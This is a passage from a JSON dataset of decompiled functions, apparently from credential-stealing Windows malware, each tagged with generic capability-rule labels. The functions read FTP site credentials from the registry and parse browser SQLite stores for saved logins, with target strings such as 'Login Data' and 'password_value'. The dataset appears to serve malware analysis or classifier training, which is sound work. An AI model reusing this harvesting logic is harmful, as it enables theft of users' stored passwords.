0;\n}\n",
        "token_count": 767
    },
    "0040a7a9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a7a9(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint *var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint ARG_0;\n    \n    ARG_0 = fcn.004017a5(0x2000);\n    var_8h = fcn.004017a5(0x2000);\n    var_ch = fcn.004017a5(0x2000);\n    var_10h = fcn.004017a5(0x2000);\n    var_14h = fcn.004017a5(0x2000);\n    var_18h = fcn.004017a5(0x2000);\n    var_1ch = fcn.004017a5(0x2000);\n    sub.user32.dll_wsprintfA(ARG_0, \"SiteServer %d\\\\Host\", arg_10h);\n    sub.user32.dll_wsprintfA(var_8h, \"SiteServer %d\\\\WebUrl\", arg_10h);\n    sub.user32.dll_wsprintfA(var_ch, \"SiteServer %d\\\\Remote Directory\", arg_10h);\n    sub.user32.dll_wsprintfA(var_10h, \"SiteServer %d-User\", arg_10h);\n    sub.user32.dll_wsprintfA(var_14h, \"SiteServer %d-User PW\", arg_10h);\n    sub.user32.dll_wsprintfA(var_18h, \"%s\\\\Keychain\", arg_ch);\n    sub.user32.dll_wsprintfA(var_1ch, \"SiteServer %d\\\\SFTP\", arg_10h);\n    var_20h = fcn.00401b82(*0x4120d5, arg_ch, ARG_0, 0);\n    var_24h = fcn.00401b82(*0x4120d5, arg_ch, var_8h, 0);\n    var_28h = fcn.00401b82(*0x4120d5, arg_ch, var_ch, 0);\n    var_2ch = fcn.00401b82(*0x4120d5, var_18h, var_10h, 0);\n    var_30h = fcn.00401b82(*0x4120d5, var_18h, var_14h, 0);\n    var_34h = fcn.00401b82(*0x4120d5, arg_ch, var_1ch, &var_40h);\n    if (((var_20h != 0) && (var_2ch != 0)) && (var_30h != 0)) {\n        iVar1 = fcn.0040a68f(var_2ch, &var_3ch);\n        if ((iVar1 != 0) && (var_3ch != 0)) {\n            iVar1 = fcn.0040a68f(var_30h, &var_38h);\n            if ((iVar1 != 0) && (var_38h != 0)) {\n                fcn.00401522(arg_8h, 0xbeef0010);\n                fcn.00401584(arg_8h, var_20h);\n                fcn.00401584(arg_8h, var_24h);\n                fcn.00401584(arg_8h, var_28h);\n                fcn.00401558(arg_8h, var_2ch, var_3ch);\n                fcn.00401558(arg_8h, var_30h, var_38h);\n                if ((var_34h == NULL) || (var_40h != 4)) {\n                    fcn.00401522(arg_8h, 0);\n                }\n                else {\n                    fcn.00401522(arg_8h, *var_34h);\n                }\n            }\n        }\n    }\n    fcn.0040178e(ARG_0);\n    fcn.0040178e(var_8h);\n    fcn.0040178e(var_ch);\n    fcn.0040178e(var_10h);\n    fcn.0040178e(var_14h);\n    fcn.0040178e(var_18h);\n    fcn.0040178e(var_1ch);\n    fcn.0040178e(var_20h);\n    fcn.0040178e(var_24h);\n    fcn.0040178e(var_28h);\n    fcn.0040178e(var_2ch);\n    fcn.0040178e(var_30h);\n    fcn.0040178e(var_34h);\n    return;\n}\n",
        "token_count": 1134
    },
    "0040aa42": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040aa42(uint arg_8h, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint lpString2;\n    uint arg_ch;\n    uint var_818h;\n    uint32_t *var_814h;\n    uint lpName;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(*0x4120d5, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            lpString2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            arg_ch = fcn.00401c09(lpString2, &lpName);\n            fcn.0040178e(lpString2);\n            var_814h = fcn.00401b82(*0x4120d5, arg_ch, \"SiteServers\", &var_10h);\n            if (var_814h != NULL) {\n                if (var_10h == 4) {\n                    var_814h = *var_814h;\n                    if (1000 < var_814h) {\n                        var_814h = 0x3e8;\n                    }\n                    while (var_814h != NULL) {\n                        var_814h = var_814h - 1;\n                        fcn.0040a7a9(arg_8h, arg_ch, var_814h);\n                    }\n                }\n                fcn.0040178e(var_814h);\n            }\n            fcn.0040178e(var_814h);\n            fcn.0040aa42(arg_8h, arg_ch);\n            fcn.0040178e(arg_ch);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 495
    },
    "0040abae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040abae(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char *lpString;\n    char *pcVar3;\n    char *pcVar4;\n    uint hMem;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x31, 0);\n    cVar1 = **0x41205d;\n    lpString = *0x412059;\n    pcVar4 = *0x41205d;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if (iVar2 != 0) {\n            arg_ch_00 = fcn.0040223e(lpString);\n            hMem = arg_8h;\n            fcn.0040404c(arg_8h, arg_ch_00, 0x413c0e, 0xbeef0000);\n            fcn.0040178e(hMem);\n        }\n        for (; *lpString != '\\0'; lpString = lpString + 1) {\n        }\n        lpString = lpString + 1;\n        iVar2 = -1;\n        pcVar3 = pcVar4;\n        do {\n            pcVar4 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 402
    },
    "0040ac2c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nulong __cdecl fcn.0040ac2c(uint arg_8h, int32_t *arg_ch, uint32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    if (*arg_ch == 0) {\n        return 0;\n    }\n    uVar2 = 1;\n    do {\n        if (9 < uVar2) {\ncode_r0x0040acbf:\n            if (*arg_ch == 0) {\n                var_8h = 0;\n                var_4h = 0;\n            }\n            return CONCAT44(var_4h, var_8h);\n        }\n        if (arg_10h != NULL) {\n            *arg_10h = uVar2;\n        }\n        uVar1 = fcn.004013f9(arg_8h, arg_ch);\n        if (uVar2 == 9) {\n            var_8h = var_8h | uVar1;\n            goto code_r0x0040acbf;\n        }\n        var_8h = var_8h | uVar1 & 0xffffff7f;\n        if ((uVar1 & 0x80) == 0) goto code_r0x0040acbf;\n        if (uVar2 == 8) {\n            var_4h = var_4h << 8 | var_8h >> 0x18;\n            var_8h = var_8h << 8;\n        }\n        else {\n            var_4h = var_4h << 7 | var_8h >> 0x19;\n            var_8h = var_8h << 7;\n        }\n        uVar2 = uVar2 + 1;\n    } while( true );\n}\n",
        "token_count": 440
    },
    "0040acd8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040acd8(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t *arg_14h)\n\n{\n    int64_t iVar1;\n    uint arg_ch_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint arg_10h_00;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x417094 < arg_ch) {\n        return 0;\n    }\n    arg_ch_00 = fcn.004017a5(*0x417094);\n    fcn.00401000(&var_4h);\n    iVar2 = fcn.0040137a(arg_8h, arg_ch_00, arg_ch, arg_14h);\n    if (iVar2 != 0) {\n        fcn.004011aa(var_4h, arg_ch_00, arg_ch);\n        if (arg_10h <= arg_ch) goto code_r0x0040addc;\n        var_ch = fcn.004013a0(arg_8h, arg_14h);\n        while( true ) {\n            if (var_ch == 0) goto code_r0x0040addc;\n            iVar1 = (var_ch - 1) * *0x417094;\n            if (iVar1 >> 0x20 != 0) break;\n            fcn.00401051(arg_8h, iVar1, 0);\n            var_ch = fcn.004013a0(arg_8h, arg_14h);\n            if ((*arg_14h == 0) ||\n               (arg_10h_00 = arg_8h,  iVar2 = fcn.0040137a(arg_8h, arg_ch_00, *0x417094 - 4, arg_14h),  iVar2 == 0))\n            break;\n            fcn.004011aa(var_4h, arg_ch_00, arg_10h_00);\n            uVar3 = fcn.00401091();\n            if (0x6400000 < uVar3) break;\n        }\n    }\n    fcn.00401026(var_4h);\n    var_4h = 0;\n    *arg_14h = 0;\ncode_r0x0040addc:\n    fcn.0040178e(arg_ch_00);\n    return var_4h;\n}\n",
        "token_count": 538
    },
    "0040adeb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040adeb(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t **arg_14h)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.004017a5(arg_ch + 8);\n    *piVar1 = arg_ch;\n    piVar1[1] = arg_10h;\n    if (arg_ch != 0) {\n        fcn.004017dc(arg_8h, piVar1 + 2, arg_ch);\n    }\n    *arg_14h = piVar1;\n    return 1;\n}\n",
        "token_count": 142
    },
    "0040ae2c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ae2c(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    bool bVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_14h = 0;\n    bVar3 = (arg_ch & 1) == 0;\n    if (arg_ch == 0) {\n        uVar2 = fcn.0040adeb(0, 0, 3, arg_14h);\n    }\n    else if (arg_ch == 1) {\n        var_4h = fcn.004013f9(arg_8h, arg_10h);\n        uVar2 = fcn.0040adeb(&var_4h, 4, 0, arg_14h);\n    }\n    else if (arg_ch == 2) {\n        var_4h = fcn.004013cc(arg_8h, arg_10h);\n        uVar2 = fcn.0040adeb(&var_4h, 4, 0, arg_14h);\n    }\n    else if (arg_ch == 3) {\n        fcn.00401424(arg_8h, 3, arg_10h);\n        uVar2 = fcn.0040adeb(0, 0, 3, arg_14h);\n    }\n    else if (arg_ch == 4) {\n        var_4h = fcn.004013a0(arg_8h, arg_10h);\n        uVar2 = fcn.0040adeb(&var_4h, 4, 0, arg_14h);\n    }\n    else if (arg_ch == 5) {\n        fcn.00401424(arg_8h, 6, arg_10h);\n        uVar2 = fcn.0040adeb(0, 0, 3, arg_14h);\n    }\n    else if (arg_ch == 6) {\n        fcn.00401424(arg_8h, 8, arg_10h);\n        uVar2 = fcn.0040adeb(0, 0, 3, arg_14h);\n    }\n    else if (arg_ch == 7) {\n        fcn.00401424(arg_8h, 8, arg_10h);\n        uVar2 = fcn.0040adeb(0, 0, 3, arg_14h);\n    }\n    else if (arg_ch == 8) {\n        var_4h = 0;\n        uVar2 = fcn.0040adeb(&var_4h, 4, 0, arg_14h);\n    }\n    else if (arg_ch == 9) {\n        var_4h = 1;\n        uVar2 = fcn.0040adeb(&var_4h, 4, 0, arg_14h);\n    }\n    else if (arg_ch == 10) {\n        uVar2 = 0;\n    }\n    else if (arg_ch == 0xb) {\n        uVar2 = 0;\n    }\n    else if (((arg_ch < 0xc) || (!bVar3)) || (0x63fffff < arg_ch)) {\n        if (((arg_ch < 0xd) || (bVar3)) || (0x63fffff < arg_ch)) {\n            uVar2 = 0;\n        }\n        else {\n            uVar1 = arg_ch - 0xd >> 1;\n            uVar2 = fcn.004017a5(uVar1);\n            fcn.0040137a(arg_8h, uVar2, uVar1, arg_10h);\n            fcn.0040adeb(uVar2, uVar1, 1, arg_14h);\n            fcn.0040178e(uVar2);\n            uVar2 = 1;\n        }\n    }\n    else {\n        uVar1 = arg_ch - 0xc >> 1;\n        uVar2 = fcn.004017a5(uVar1);\n        fcn.0040137a(arg_8h, uVar2, uVar1, arg_10h);\n        fcn.0040adeb(uVar2, uVar1, 2, arg_14h);\n        fcn.0040178e(uVar2);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 1005
    },
    "0040b096": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b096(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = arg_8h;\n    if (arg_8h != NULL) {\n        for (; *piVar1 != 0; piVar1 = piVar1 + 1) {\n            fcn.0040178e(*piVar1);\n        }\n        fcn.0040178e(arg_8h);\n        return;\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "0040b0c6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b0c6(int32_t arg_8h, int32_t arg_ch, uint *arg_10h, uint *arg_14h, int32_t *arg_18h)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *(arg_8h + arg_ch * 4);\n    if (arg_10h != NULL) {\n        *arg_10h = *puVar1;\n    }\n    if (arg_14h != NULL) {\n        *arg_14h = puVar1[1];\n    }\n    if (arg_18h != NULL) {\n        *arg_18h = puVar1;\n        *arg_18h = *arg_18h + 8;\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "0040b100": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b100(int32_t arg_8h, int32_t **arg_ch, int32_t *arg_10h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t *piVar3;\n    ulong uVar4;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    *arg_10h = 0;\n    *arg_ch = NULL;\n    if (arg_8h == 0) {\n        return 0;\n    }\n    var_8h = fcn.00401091(arg_8h);\n    if (var_8h != 0) {\n        fcn.004012e8(arg_8h);\n        var_ch = 1;\n        uVar4 = fcn.0040ac2c(arg_8h, &var_ch, &var_14h);\n        if (((uVar4 < var_14h) || (var_ch == 0)) || (uVar4 >> 0x20 != 0)) {\n            return 0;\n        }\n        var_18h = uVar4 - var_14h;\n        if (0xa00000 < var_18h) {\n            return 0;\n        }\n        var_4h = fcn.004017a5(var_18h * 4);\n        var_1ch = 0;\n        puVar2 = var_4h;\n        while ((var_18h != 0 && (var_ch != 0))) {\n            uVar4 = fcn.0040ac2c(arg_8h, &var_ch, &var_10h);\n            if ((var_18h < var_10h) || (uVar4 >> 0x20 != 0)) {\n                fcn.0040178e(var_4h);\n                return 0;\n            }\n            var_18h = var_18h - var_10h;\n            var_1ch = var_1ch + 1;\n            *puVar2 = uVar4;\n            puVar2 = puVar2 + 1;\n        }\n        if ((var_18h != 0) || (var_ch == 0)) {\n            fcn.0040178e(var_4h);\n            return 0;\n        }\n        if (var_1ch != 0) {\n            *arg_10h = var_1ch;\n            arg_8h_00 = fcn.004017a5(var_1ch << 2);\n            puVar2 = var_4h;\n            piVar3 = arg_8h_00;\n            while ((var_1ch != 0 && (var_ch != 0))) {\n                var_20h = 0;\n                iVar1 = fcn.0040ae2c(arg_8h, *puVar2, &var_ch, &var_20h);\n                if ((iVar1 == 0) || ((var_ch == 0 || (var_20h == 0)))) {\n                    if (var_20h != 0) {\n                        fcn.0040178e(var_20h);\n                    }\n                    fcn.0040b096(arg_8h_00);\n                    fcn.0040178e(var_4h);\n                    return 0;\n                }\n                *piVar3 = var_20h;\n                var_1ch = var_1ch + -1;\n                puVar2 = puVar2 + 1;\n                piVar3 = piVar3 + 1;\n            }\n            *arg_ch = arg_8h_00;\n        }\n        fcn.0040178e(var_4h);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 883
    },
    "0040b2aa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b2aa(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h, uint arg_18h, code *arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t arg_ch_00;\n    uint32_t uVar3;\n    ulong uVar4;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_10h == 0) {\n        return 1;\n    }\n    var_10h = (arg_10h + -1) * *0x417094;\n    fcn.00401051(arg_8h, var_10h, 0);\n    if (arg_10h + -1 == 0) {\n        fcn.00401051(arg_8h, 100, 1);\n    }\n    var_4h = fcn.004013f9(arg_8h, arg_14h);\n    fcn.004013cc(arg_8h, arg_14h);\n    var_8h = fcn.004013cc(arg_8h, arg_14h);\n    fcn.004013cc(arg_8h, arg_14h);\n    fcn.004013f9(arg_8h, arg_14h);\n    if ((*arg_14h == 0) || ((var_4h != 0xd && (var_4h != 5)))) {\n        return 0;\n    }\n    if (*0x417094 >> 1 < var_8h) {\n        return 0;\n    }\n    if (var_4h == 5) {\n        var_38h = fcn.004013a0(arg_8h, arg_14h);\n    }\n    var_ch = fcn.004017a5(0x10000);\n    for (uVar3 = 0; uVar3 < var_8h; uVar3 = uVar3 + 1) {\n        uVar1 = fcn.004013cc(arg_8h, arg_14h);\n        *(var_ch + uVar3 * 4) = uVar1;\n    }\n    if (*arg_14h == 0) {\n        fcn.0040178e(var_ch);\n        return 0;\n    }\n    if (var_4h == 5) {\n        for (uVar3 = 0; uVar3 < var_8h; uVar3 = uVar3 + 1) {\n            fcn.00401051(arg_8h, *(var_ch + uVar3 * 4) + var_10h, 0);\n            uVar1 = fcn.004013a0(arg_8h, arg_14h);\n            fcn.0040ac2c(arg_8h, arg_14h, 0);\n            if (*arg_14h == 0) {\n                fcn.0040178e(var_ch);\n                return 0;\n            }\n            iVar2 = fcn.0040b2aa(arg_8h, arg_ch, uVar1, arg_14h, arg_18h, arg_1ch);\n            if (iVar2 == 0) {\n                fcn.0040178e(var_ch);\n                return 0;\n            }\n        }\n        iVar2 = fcn.0040b2aa(arg_8h, arg_ch, var_38h, arg_14h, arg_18h, arg_1ch);\n        if (iVar2 == 0) {\n            fcn.0040178e(var_ch);\n            return 0;\n        }\n    }\n    else if (var_4h == 0xd) {\n        for (uVar3 = 0; uVar3 < var_8h; uVar3 = uVar3 + 1) {\n            fcn.00401051(arg_8h, *(var_ch + uVar3 * 4) + var_10h, 0);\n            uVar4 = fcn.0040ac2c(arg_8h, arg_14h, 0);\n            if (*arg_14h == 0) {\n                fcn.0040178e(var_ch);\n                return 0;\n            }\n            if (uVar4 >> 0x20 != 0) break;\n            var_14h = uVar4;\n            fcn.0040ac2c(arg_8h, arg_14h, 0);\n            if (*arg_14h == 0) {\n                fcn.0040178e(var_ch);\n                return 0;\n            }\n            var_20h = ((*0x417094 - 0xc) * 0x20) / 0xff - 0x17;\n            var_18h = *0x417094 - 0x23;\n            arg_ch_00 = var_14h;\n            if ((var_18h < var_14h) &&\n               (var_1ch = (var_14h - var_20h) % (*0x417094 - 4) + var_20h,  arg_ch_00 = var_1ch,  var_18h < var_1ch)) {\n                arg_ch_00 = var_20h;\n            }\n            iVar2 = fcn.0040acd8(arg_8h, arg_ch_00, var_14h, arg_14h);\n            if (iVar2 == 0) {\n                fcn.0040178e(var_ch);\n                return 0;\n            }\n            var_24h = iVar2;\n            iVar2 = fcn.0040b100(iVar2, &var_28h, &var_2ch);\n            fcn.00401026(var_24h);\n            if ((iVar2 != 0) && (var_28h != 0)) {\n                (*arg_1ch)(arg_8h, arg_ch, var_28h, var_2ch, arg_18h);\n                fcn.0040b096(var_28h);\n            }\n        }\n    }\n    fcn.0040178e(var_ch);\n    return 1;\n}\n",
        "token_count": 1454
    },
    "0040b5b5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b5b5(char *pszFirst, code *arg_ch)\n\n{\n    bool bVar1;\n    uint8_t uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = sub.shlwapi.dll_StrStrIA\n                       (pszFirst, \n                        L\"() \u4f43\u534e\u5254\u4941\u544e\u5000\u4952\u414d\u5952\u5500\u494e\u5551E\u4843\u4345K\u4f46\u4552\u4749N\u5700\u6265\u4420\u7461a\u6f4c\u6967\\x206e\u6144\u6174\u6c00\u676f\u6e69s\u726f\u6769\u6e69\u755f\u6c72\u7000\u7361\u7773\u726f\u5f64\u6176\u756ce\u7375\u7265\u616e\u656d\u765f\u6c61\u6575\u6600\u7074\u2f3a/\u7468\u7074\u2f3a/\u7468\u7074\u3a73\u2f2f\u6d00\u7a6f\u6c5f\u676f\u6e69s\u6f68\u7473\u616e\u656d\u6500\u636e\u7972\u7470\u6465\u6150\u7373\u6f77\u6472\u6500\u636e\u7972\u7470\u6465\u7355\u7265\u616e\u656d\u5c00\u6f47\u676f\u656c\u435c\u7268\u6d6fe\u435c\u7268\u6d6f\u7569m\u435c\u7268\u6d6f\u5065\u756cs\u6f53\u7466\u6177\u6572\u435c\u7268\u6d6f\u5065\u756cs\u6e49\u7473\u6c61\u5f6c\u6944r\u425c\u6f72\u696d\u6d75\u5c00\u694e\u6863\u6f72\u656d\u5c00\u6f43\u6f6d\u6f64\u5c00\u6f52\u6b63\u654d\u746c\u4b00\u4d2d\u6c65\u6f65n\u4b5c\u4d2d\u6c65\u6f65n\u505c\u6f72\u6966\u656cs\u7045\u6369\u5c00\u7045\u6369\u455c\u6970c\u7453\u6661\u2d66\u5446P\u6973\u6574\u2e73\u6e69i\u535c\u7469\u7365\u5c00\u6956\u6973\u6f63\\x206d\u654d\u6964a\u662e\u7074\u5300\u6500\u7400\u7400\u6900\u6e00\u6700\u7300\"\n                       );\n    pcVar5 = pszFirst;\n    if (pcVar3 == NULL) {\n        return;\n    }\n    while (pcVar3 = pcVar3 + 1,  *pcVar3 != '\\0') {\n        *pcVar5 = *pcVar3;\n        pcVar5 = pcVar5 + 1;\n    }\n    *pcVar5 = *pcVar3;\n    iVar4 = sub.shlwapi.dll_StrStrIA\n                      (pszFirst, \n                       L\") \u4f43\u534e\u5254\u4941\u544e\u5000\u4952\u414d\u5952\u5500\u494e\u5551E\u4843\u4345K\u4f46\u4552\u4749N\u5700\u6265\u4420\u7461a\u6f4c\u6967\\x206e\u6144\u6174\u6c00\u676f\u6e69s\u726f\u6769\u6e69\u755f\u6c72\u7000\u7361\u7773\u726f\u5f64\u6176\u756ce\u7375\u7265\u616e\u656d\u765f\u6c61\u6575\u6600\u7074\u2f3a/\u7468\u7074\u2f3a/\u7468\u7074\u3a73\u2f2f\u6d00\u7a6f\u6c5f\u676f\u6e69s\u6f68\u7473\u616e\u656d\u6500\u636e\u7972\u7470\u6465\u6150\u7373\u6f77\u6472\u6500\u636e\u7972\u7470\u6465\u7355\u7265\u616e\u656d\u5c00\u6f47\u676f\u656c\u435c\u7268\u6d6fe\u435c\u7268\u6d6f\u7569m\u435c\u7268\u6d6f\u5065\u756cs\u6f53\u7466\u6177\u6572\u435c\u7268\u6d6f\u5065\u756cs\u6e49\u7473\u6c61\u5f6c\u6944r\u425c\u6f72\u696d\u6d75\u5c00\u694e\u6863\u6f72\u656d\u5c00\u6f43\u6f6d\u6f64\u5c00\u6f52\u6b63\u654d\u746c\u4b00\u4d2d\u6c65\u6f65n\u4b5c\u4d2d\u6c65\u6f65n\u505c\u6f72\u6966\u656cs\u7045\u6369\u5c00\u7045\u6369\u455c\u6970c\u7453\u6661\u2d66\u5446P\u6973\u6574\u2e73\u6e69i\u535c\u7469\u7365\u5c00\u6956\u6973\u6f63\\x206d\u654d\u6964a\u662e\u7074\u5300\u6500\u7400\u7400\u6900\u6e00\u6700\u7300\"\n                      );\n    pcVar3 = pszFirst;\n    if (iVar4 != 0) {\n        for (; *pcVar3 != '\\0'; pcVar3 = pcVar3 + 1) {\n            if (((((*pcVar3 == '\\t') || (*pcVar3 == '\\r')) || (*pcVar3 == '\\n')) ||\n                ((*pcVar3 == '[' || (*pcVar3 == ']')))) || (*pcVar3 == '`')) {\n                *pcVar3 = ' ';\n            }\n        }\n        bVar1 = false;\n        uVar2 = 0;\n        for (pcVar3 = pszFirst; pcVar5 = pszFirst,  *pcVar3 != '\\0'; pcVar3 = pcVar3 + 1) {\n            if (*pcVar3 == '\\'') {\n                if (bVar1) {\n                    if (!(uVar2 & 1)) {\n                        *pcVar3 = ' ';\n                        bVar1 = false;\n                    }\n                }\n                else if (!(uVar2 & 1)) {\n                    bVar1 = true;\n                }\n            }\n            if (*pcVar3 == '\\\\') {\n                uVar2 = uVar2 + 1;\n            }\n            else {\n                uVar2 = 0;\n            }\n            if (bVar1) {\n                *pcVar3 = ' ';\n            }\n        }\n        for (; *pcVar5 != '\\0'; pcVar5 = pcVar5 + 1) {\n            if ((*pcVar5 == ' ') && (pcVar3 = pcVar5,  pcVar5[1] == ' ')) {\n                for (; *pcVar3 != '\\0'; pcVar3 = pcVar3 + 1) {\n                    *pcVar3 = pcVar3[1];\n                }\n                pcVar5 = pcVar5 + -1;\n            }\n        }\n        var_ch = 0;\n        pcVar3 = pszFirst;\n        do {\n            if (*pcVar3 == '\\0') {\n                (*arg_ch)(pszFirst, var_ch);\n                return;\n            }\n            if (*pcVar3 == ',') {\n                *pcVar3 = '\\0';\n                iVar4 = (*arg_ch)(pszFirst, var_ch);\n                if (iVar4 == 0) {\n                    return;\n                }\n                pszFirst = pcVar3 + 1;\n                var_ch = var_ch + 1;\n            }\n            pcVar3 = pcVar3 + 1;\n        } while( true );\n    }\n    return;\n}\n",
        "token_count": 1632
    },
    "0040b6f1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
